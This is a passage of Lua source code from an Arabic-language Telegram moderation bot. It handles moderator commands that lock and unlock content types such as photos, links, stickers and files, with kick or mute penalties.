elseif text == 'فتح الروابط بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــروابط بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'فتح الشارحه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــشارحه بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المعرفات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمعرفات بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التاك بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتاك بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الصوت بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصوت بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الفيديو بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــفيديو بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المتحركه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمتحركه بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملصقات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملصقات بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الالعاب بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الالـعاب بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الاغاني بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الاغـاني بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح اللستات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* اللستـات بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الدخول بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح دخول الاعضاء* بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التوجيه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتوجيه بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الكلايش بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــكلايش بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملفات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملفات بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التعديل بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:edit'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح تعديل الرسائل* بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الماركداون بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الماركداون بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الجهات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــجهات بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح اضافه البوتات بالطرد *\n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح السيلفي بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* بصمه الفيديو بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end    
if text == 'قفل الصور بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصور  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الروابط بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockktm:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــروابط  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الشارحه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــشارحه  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المعرفات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمعرفات  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التاك بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتاك  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الصوت بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصوت  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الفيديو بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــفيديو  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المتحركه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمتحركه  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملصقات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملصقات  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الالعاب بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الالـعاب  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الاغاني بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الاغـاني  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل اللستات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* اللستـات  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الدخول بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم قفـل دخول الاعضاء*  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التوجيه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتوجيه  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الكلايش بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــكلايش  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملفات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملفات  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الماركداون بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:mark'..msg.chat_id_,true)   taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الماركداون  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الجهات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــجهات  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل السيلفي بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockktm:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:self'..chat_id,true)  tahadevstorm:del(DEVSTOR..'lockkick:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* بصمه الفيديو  \n*◗📛¦ خـاصيــه ، الكتــم 🔕*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end
if text == 'فتح الصور بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصور بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الروابط بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockktm:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــروابط بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'فتح الشارحه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــشارحه بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المعرفات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمعرفات بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التاك بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتاك بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الصوت بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصوت بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الفيديو بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح ارسـال الــفيديو بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المتحركه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمتحركه بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملصقات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملصقات بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الالعاب بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الالـعاب بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الاغاني بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الاغـاني بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح اللستات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* اللستـات بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الدخول بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح دخول الاعضاء* بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التوجيه بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتوجيه بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الكلايش بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــكلايش بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملفات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملفات بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التعديل بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:edit'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح تعديل الرسائل* بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الماركداون بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الماركداون بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الجهات بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــجهات بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح السيلفي بالكتم' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockktm:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* بصمه الفيديو بالكتم \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end    
